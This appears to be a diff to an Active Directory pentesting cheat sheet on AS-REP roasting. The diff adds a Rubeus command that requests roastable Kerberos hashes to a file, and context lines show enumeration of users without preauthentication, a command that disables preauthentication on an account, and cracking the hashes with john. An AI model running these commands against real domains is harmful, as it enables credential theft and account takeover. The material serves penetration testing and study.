@@ -16,6 +16,13 @@ Get-DomainUser -PreauthNotRequired -Verbose
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
 ```
 {% endtab %}
+
+{% tab title="Rubeus" %}
+```powershell
+Rubeus.exe asreproast /user:<user> /outfile:file.txt
+# Later use john to crack the password
+```
+{% endtab %}
 {% endtabs %}
 
 ## Disable pre-authentication
@@ -29,8 +36,6 @@ Set-DomainObject -Identity <User> -XOR @{useraccountcontrol=4194304} -Verbose
 {% endtabs %}
 
 ## Retrieve the hash
-
-
 
 {% tabs %}
 {% tab title="PowerView" %}
@@ -46,4 +51,3 @@ Invoke-ASREPRoast -Verbose
 ```powershell
 john.exe --wordlist=passwords.txt asrephashes.txt
 ```
-
